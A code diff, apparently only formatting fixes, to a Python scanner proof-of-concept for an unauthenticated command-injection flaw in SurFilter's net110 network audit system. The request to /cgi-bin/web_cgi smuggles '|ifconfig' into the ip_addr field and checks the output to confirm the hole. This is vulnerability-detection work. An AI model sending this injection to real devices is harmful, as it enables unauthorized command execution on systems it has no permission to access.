@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'SurFilter_0001'  # 平台漏洞编号，留空
     name = '任子行net110网络审计系统无需登录任意命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         任子行net110网络审计系统无需登录任意命令执行（疑似后门）。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '任子行网络审计系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '63719b8d-41df-4d6d-96a8-030c6de282b2'
@@ -38,10 +40,10 @@ class Poc(ABPoc):
             arg = self.target
             url = arg + "/cgi-bin/web_cgi"
             data = 'ip_addr=www.baidu.com |ifconfig&module=net_tool&op_req=read_system&sub_module=ping'
-            code, head, res, errcode, _ = hh.http(url,data)
+            code, head, res, errcode, _ = hh.http(url, data)
 
-            if code==200 and 'Ethernet  HWaddr' in res and 'Bcast' in res:
-                #security_hole(arg)
+            if code == 200 and 'Ethernet  HWaddr' in res and 'Bcast' in res:
+                # security_hole(arg)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
